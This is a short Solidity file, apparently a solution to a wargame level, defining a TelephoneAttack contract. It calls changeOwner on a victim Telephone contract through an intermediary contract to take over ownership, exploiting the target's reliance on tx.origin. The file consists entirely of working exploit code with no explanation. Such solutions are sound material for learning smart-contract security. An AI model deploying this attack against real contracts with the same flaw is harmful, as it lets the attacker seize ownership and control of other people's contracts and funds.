pragma solidity ^0.8.11;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone private _victim;

    constructor(address payable victim) {
        _victim = Telephone(victim);
    }

    function attack() public returns (address) {
        _victim.changeOwner(address(this));

        return _victim.owner();
    }
}
